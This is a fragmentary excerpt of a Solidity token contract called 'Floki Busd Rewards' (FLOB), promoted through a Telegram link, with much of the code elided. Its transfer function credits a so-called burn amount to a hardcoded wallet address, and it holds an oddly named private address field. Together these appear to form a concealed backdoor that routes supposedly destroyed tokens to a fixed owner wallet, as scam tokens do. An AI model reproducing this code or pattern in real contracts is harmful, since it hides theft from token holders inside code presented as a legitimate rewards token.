...
// Submitted for Telegram: https://t.me/flokibusdrewards
...
contract  FlokiBusdRewards  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Floki Busd Rewards";
    string private _symbol = "FLOB";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x317FD97A4AFd3C43bBdd67C151ef8c6782169919] += _bruntoken;
